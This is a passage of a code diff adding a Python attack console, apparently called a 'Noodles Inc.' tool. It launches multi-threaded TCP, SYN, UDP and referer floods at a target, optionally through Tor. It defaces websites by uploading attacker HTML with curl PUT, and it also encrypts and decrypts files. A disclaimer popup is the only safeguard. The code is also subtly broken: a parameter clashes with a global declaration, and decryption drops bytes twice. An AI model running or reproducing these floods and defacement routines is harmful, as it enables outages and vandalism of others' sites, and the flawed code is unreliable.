+        time.sleep(random.uniform(0.01, 0.1))  # Faster Rate
+
+
+def worker():
+    while True:
+        task = task_queue.get()
+        try:
+            task()
+        except Exception as e:
+            log(f"\033[31mError executing task: {e}\033[0m")
+            log(traceback.format_exc())
+        finally:
+            task_queue.task_done()
+
+
+def start_attack(target, port, threads, use_tor):
+    global attack_running, threads, start_time
+    attack_running = True
+    start_time = time.time()
+
+    # Start threads for TCP attack
+    for _ in range(threads):
+        task_queue.put(lambda: tcp_attack(target, port, use_tor))
+    # Start threads for SYN flood
+    task_queue.put(lambda: syn_flood(socket.gethostbyname(target), port))
+    # Start threads for UDP flood
+    task_queue.put(lambda: udp_flood(socket.gethostbyname(target), port))
+    # Start threads for referer attacks
+    task_queue.put(lambda: referer_attack(target, use_tor))
+    log(f"\033[32mStarting referer attack on {target} with {threads} threads...\033[0m")  # Dark Green
+    log(f"\033[32mStarting DDoS attack on {TARGET}:{PORT} with {THREADS} threads...\033[0m")  # Dark Green
+
+    # Create worker threads
+    for _ in range(threads * 4):  # Multiply by 4 since there are 4 types of attacks
+        t = threading.Thread(target=worker)
+        t.daemon = True
+        threads.append(t)
+        t.start()
+
+    # Start the timer
+    timer.start(1000)
+
+
+def stop_attack():
+    global attack_running, timer
+    attack_running = False
+    task_queue.join()  # Wait for all tasks to be completed
+    for t in threads:
+        t.join(timeout=1)  # Wait for threads to finish
+    timer.stop()
+    log("\033[31mStopping all attack threads...\033[0m")
+
+
+def signal_handler(sig, frame):
+    print("\nCtrl+C detected. Stopping the attack...")
+    stop_attack()
+    sys.exit(0)
+
+
+# -----------------------------------------------------------------------------------------------------------------------
+#                                               Defacement Tool
+# -----------------------------------------------------------------------------------------------------------------------
+
+
+def backup_website(url):
+    try:
+        # Create a directory to store backups
+        backup_dir = "website_backups"
+        if not os.path.exists(backup_dir):
+            os.makedirs(backup_dir)
+
+        # Fetch the website content
+        response = requests.get(url, verify=False)  # Disable SSL verification temporarily
+        response.raise_for_status()  # Raise HTTPError for bad responses (4xx or 5xx)
+
+        # Create a unique filename for the backup
+        timestamp = time.strftime("%Y%m%d-%H%M%S")
+        filename = f"{urlparse(url).netloc}-{timestamp}.html"
+        filepath = os.path.join(backup_dir, filename)
+
+        # Save the content to the file
+        with open(filepath, "wb") as f:
+            f.write(response.content)
+
+        log(f"\033[32mWebsite backed up successfully to {filepath}\033[0m")  # Dark Green
+        return filepath
+
+    except requests.exceptions.RequestException as e:
+        log(f"\033[31mRequest error during backup: {e}\033[0m")  # Dark Red
+        return None
+    except Exception as e:
+        log(f"\033[31mAn unexpected error occurred during backup: {e}\033[0m")  # Dark Red
+        log(traceback.format_exc())
+        return None
+
+
+def restore_website(filepath, url):
+    try:
+        with open(filepath, "rb") as f:
+            content = f.read()
+
+        # Use curl to upload the content to the website
+        command = ["curl", "-X", "PUT", "--data-binary", f"@{filepath}", url]
+        result = subprocess.run(command, capture_output=True, text=True)
+
+        if result.returncode == 0:
+            log(f"\033[32mWebsite restored successfully from {filepath} to {url}\033[0m")  # Dark Green
+            log(f"\033[32m{result.stdout}\033[0m")
+        else:
+            log(f"\033[31mFailed to restore website: {url}\033[0m")  # Dark Red
+            log(f"\033[31m{result.stderr}\033[0m")
+
+    except FileNotFoundError:
+        log(f"\033[31mBackup file not found: {filepath}\033[0m")  # Dark Red
+    except Exception as e:
+        log(f"\033[31mAn unexpected error occurred during restoration: {e}\033[0m")  # Dark Red
+        log(traceback.format_exc())
+
+
+def deface_website(url, html_code):
+    try:
+        # Save the HTML code to a file
+        filename = "defacement.html"
+        with open(filename, "w", encoding="utf-8") as f:
+            f.write(html_code)
+
+        # Use curl to upload the defacement code to the website
+        command = ["curl", "-X", "PUT", "--data-binary", f"@{filename}", url, "-k"]  # Added -k for ignoring SSL
+        result = subprocess.run(command, capture_output=True, text=True)
+
+        if result.returncode == 0:
+            log(f"\033[32mWebsite defaced successfully: {url}\033[0m")  # Dark Green
+            log(f"\033[32m{result.stdout}\033[0m")
+        else:
+            log(f"\033[31mFailed to deface website: {url}\033[0m")  # Dark Red
+            log(f"\033[31m{result.stderr}\033[0m")
+
+    except FileNotFoundError:
+        log(f"\033[31mDefacement file not found: {filename}\033[0m")  # Dark Red
+    except Exception as e:
+        log(f"\033[31mAn unexpected error occurred during defacement: {e}\033[0m")  # Dark Red
+        log(traceback.format_exc())
+
+
+# -----------------------------------------------------------------------------------------------------------------------
+#                                               File Encryption Tool
+# -----------------------------------------------------------------------------------------------------------------------
+
+
+def generate_key(password, salt=None):
+    """Generates a secure encryption key from the password and salt."""
+    if salt is None:
+        salt = os.urandom(16)  # Generate a new salt if none is provided
+
+    password_encoded = password.encode()
+    kdf = PBKDF2HMAC(
+        algorithm=hashes.SHA256(),
+        length=32,  # 32 bytes for Fernet key
+        salt=salt,
+        iterations=100000,  # High iteration count for security
+        backend=default_backend()
+    )
+    key = base64.urlsafe_b64encode(kdf.derive(password_encoded))
+    return key, salt
+
+
+def encrypt_file(filepath, password):
+    """Encrypts a file using a secure key derived from the password."""
+    try:
+        # Generate a key and salt
+        key, salt = generate_key(password)
+
+        # Create a Fernet cipher object with the key
+        f = Fernet(key)
+
+        # Read the file content
+        with open(filepath, "rb") as file:
+            file_data = file.read()
+
+        # Encrypt the data
+        encrypted_data = f.encrypt(file_data)
+
+        # Create a backup of the original file
+        backup_filepath = filepath + ".bak"
+        shutil.copy(filepath, backup_filepath)
+        log(f"\033[32mOriginal file backed up to {backup_filepath}\033[0m")  # Dark Green
+
+        # Write the encrypted data to the file, along with the salt
+        with open(filepath, "wb") as file:
+            file.write(salt)  # Write the salt
+            file.write(encrypted_data)  # Write the encrypted data
+
+        log(f"\033[32mFile encrypted successfully: {filepath}\033[0m")  # Dark Green
+        return True
+
+    except Exception as e:
+        log(f"\033[31mAn unexpected error occurred during encryption: {e}\033[0m")  # Dark Red
+        log(traceback.format_exc())
+        return False
+
+
+def decrypt_file(filepath, password):
+    """Decrypts a file using the password and salt."""
+    try:
+        # Read the salt and encrypted data from the file
+        with open(filepath, "rb") as file:
+            salt = file.read(16)  # Read the salt (first 16 bytes)
+            encrypted_data = file.read()  # Read the rest of the data
+
+        # Generate the key using the password and salt
+        key, _ = generate_key(password, salt)
+
+        # Create a Fernet cipher object with the key
+        f = Fernet(key)
+
+        # Decrypt the data
+        decrypted_data = f.decrypt(encrypted_data[16:])
+
+        # Write the decrypted data to the file
+        with open(filepath, "wb") as file:
+            file.write(decrypted_data)
+
+        log(f"\033[32mFile decrypted successfully: {filepath}\033[0m")  # Dark Green
+        return True
+
+    except Exception as e:
+        log(f"\033[31mAn unexpected error occurred during decryption: {e}\033[0m")  # Dark Red
+        log(traceback.format_exc())
+        return False
+
+
+# -----------------------------------------------------------------------------------------------------------------------
+# Timer Function
+# -----------------------------------------------------------------------------------------------------------------------
+def update_timer():
+    global start_time
+    if attack_running:
+        elapsed_time = time.time() - start_time
+        minutes, seconds = divmod(int(elapsed_time), 60)
+        hours, minutes = divmod(minutes, 60)
+        timer_label.setText(f"Time Running: {hours:02}:{minutes:02}:{seconds:02}")
+
+
+# -----------------------------------------------------------------------------------------------------------------------
+#                                               Main Function
+# -----------------------------------------------------------------------------------------------------------------------
+
+if __name__ == "__main__":
+    # Consent popup
+    app = QApplication(sys.argv)
+    app.setStyle("Fusion")  # Set a modern style
+
+    # Dark color palette
+    palette = QPalette()
+    palette.setColor(QPalette.Window, QColor(0, 0, 0))  # Black
+    palette.setColor(QPalette.WindowText, QColor(0, 255, 0))  # Dark Green
+    palette.setColor(QPalette.Base, QColor(30, 30, 30))  # Dark Gray
+    palette.setColor(QPalette.AlternateBase, QColor(30, 30, 30))
+    palette.setColor(QPalette.ToolTipBase, QColor(0, 255, 0))
+    palette.setColor(QPalette.ToolTipText, QColor(0, 255, 0))
+    palette.setColor(QPalette.Text, QColor(0, 255, 0))
+    palette.setColor(QPalette.Button, QColor(30, 30, 30))
+    palette.setColor(QPalette.ButtonText, QColor(0, 255, 0))
+    palette.setColor(QPalette.BrightText, Qt.red)
+    palette.setColor(QPalette.Link, QColor(255, 0, 255))  # Purple
+    palette.setColor(QPalette.Highlight, QColor(255, 0, 255))
+    palette.setColor(QPalette.HighlightedText, QColor(0, 0, 0))
+    app.setPalette(palette)
+
+    msg = QMessageBox()
+    msg.setIcon(QMessageBox.Warning)
+    msg.setText(
+        "WARNING: This tool is for aggressive security testing only. Unauthorized use is illegal. Noodles Inc. is NOT responsible for your actions.")
+    msg.setWindowTitle("Noodles Inc. Disclaimer")
+    msg.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
+    reply = msg.exec_()
+
+    if reply == QMessageBox.No:
+        print("User declined consent. Exiting...")
+        sys.exit()
+
+    # Timer label setup
+    timer_label = QLabel("Time Running: 00:00:00")
+    timer_label.setAlignment(Qt.AlignCenter)
+    timer_label.setStyleSheet("font-size: 16px; color: #00ff00;")
+
+    # Timer setup
+    timer = QTimer()
+    timer.timeout.connect(update_timer)
+
+    signal.signal(signal.SIGINT, signal_handler)
+    print(
+        "Type 'start' to begin the DDoS attack, 'stop' to end it, 'backup' to back up website, 'restore' to restore, 'deface' to deface, 'encrypt' to encrypt file, or 'decrypt' to decrypt file.")
+    while True:
+        command = input("> ").lower()
+        if command == 'start':
+            start_attack(TARGET, PORT, THREADS, USE_TOR)
+        elif command == 'stop':
+            stop_attack()
+        elif command == 'backup':
+            url = input("Enter website URL to backup: ")
+            backup_website(url)
+        elif command == 'restore':
+            filepath = input("Enter backup filepath: ")
+            url = input("Enter target URL to restore: ")
+            restore_website(filepath, url)
+        elif command == 'deface':
+            url = input("Enter website URL to deface: ")
+            html_code = input("Enter HTML code for defacement: ")
+            deface_website(url, html_code)
+        elif command == 'encrypt':
+            filepath = input("Enter file path to encrypt: ")
+            password = input("Enter password for encryption: ")
+            encrypt_file(filepath, password)
+        elif command == 'decrypt':
+            filepath = input("Enter file path to decrypt: ")
+            password = input("Enter password for decryption: ")
+            decrypt_file(filepath, password)
+        else:
+            print("Invalid command. Use 'start', 'stop', 'backup', 'restore', 'deface', 'encrypt' or 'decrypt'.")
